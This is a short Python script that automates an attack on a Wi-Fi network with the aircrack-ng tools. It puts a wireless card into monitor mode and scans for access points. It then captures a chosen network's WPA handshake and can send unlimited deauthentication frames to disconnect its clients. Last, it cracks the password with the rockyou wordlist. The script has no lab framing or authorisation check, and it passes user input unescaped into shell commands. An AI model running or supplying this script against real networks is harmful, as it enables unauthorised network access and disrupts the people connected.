import subprocess
import time

def run_command(command):
    """Run a command in terminal and stream output."""
    try:
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError:
        print(f"Command failed: {command}")

def main():
    print("Step 1: Killing processes that may interfere...")
    run_command("sudo airmon-ng check kill")

    print("Step 2: Starting monitor mode on wlan0...")
    run_command("sudo airmon-ng start wlan0")
   
    print("Step 3: Scanning for Access Points. Close when you find your target (CTRL+C)...")
    run_command("sudo airodump-ng wlan0mon")
   
    # Get AP information from user
    bssid = input("Enter the target BSSID: ").strip()
    channel = input("Enter the target channel number: ").strip()
    filename = input("Enter the file name to save capture (no extension): ").strip()

    print("Step 4: Capturing handshake. Press CTRL+C when handshake is captured.")
    command = f"sudo airodump-ng -w {filename} -c {channel} --bssid {bssid} wlan0mon"
    run_command(command)

    print("Optional Step: Deauthenticating clients to capture handshake faster...")
    deauth_choice = input("Do you want to deauth clients? (yes/no): ").strip().lower()
    if deauth_choice == "yes":
        run_command(f"sudo aireplay-ng --deauth 0 -a {bssid} wlan0mon")

    print("Step 5: Stopping monitor mode...")
    run_command("sudo airmon-ng stop wlan0mon")

    print("Step 6: Cracking password with aircrack-ng and rockyou.txt...")
    cap_file = f"{filename}-01.cap"
    run_command(f"sudo aircrack-ng {cap_file} -w /usr/share/wordlists/rockyou.txt")

if __name__ == "__main__":
    main()
